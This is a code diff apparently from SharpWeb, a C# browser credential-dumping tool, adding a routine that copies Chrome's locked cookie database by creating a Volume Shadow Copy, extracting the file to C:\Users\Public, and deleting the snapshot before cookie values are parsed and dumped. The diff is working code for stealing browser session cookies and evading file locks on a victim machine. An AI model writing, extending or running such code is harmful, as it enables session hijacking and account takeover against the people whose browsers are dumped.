@@ -8,6 +8,7 @@ using SharpWeb.Utilities;
 using Community.CsharpSqlite.SQLiteClient;
 using static SharpWeb.Utilities.Current;
 using static SharpWeb.Display.OutputFormatting;
+using static SharpWeb.Utilities.Vsscopy;
 
 namespace SharpWeb.Browsers
 {
@@ -103,12 +104,31 @@ namespace SharpWeb.Browsers
             Console.WriteLine();
         }
 
-
+        private static string PathCookie(string chrome_cookie_path)
+        {
+            string shadowCopyID = string.Empty;
+            string cookie_tempFile = string.Empty;
+            try
+            {
+                cookie_tempFile = Path.GetTempFileName();
+                File.Copy(chrome_cookie_path, cookie_tempFile, true);
+            }
+            catch
+            {
+                string newCookie = chrome_cookie_path.Replace("C:", "");
+                shadowCopyID = CreateShadow();
+                cookie_tempFile = @"C:\Users\Public\C";
+                string path = String.Format("{0}{1}", ListShadow(shadowCopyID), newCookie);
+                Natives.CopyFile(path, cookie_tempFile, true);
+                DeleteShadow(shadowCopyID);
+            }
+            return cookie_tempFile;
+        }
         public static void Cookies(string chrome_cookie_path, string chrome_state_file)
         {
             try
             {
-                string cookie_data_tempFile = CreateTmpFile(chrome_cookie_path);
+                string cookie_data_tempFile = PathCookie(chrome_cookie_path);
                 string[] Jsonheader = new string[] { "domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value" };
                 List<string[]> Jsondata = new List<string[]> { };
 
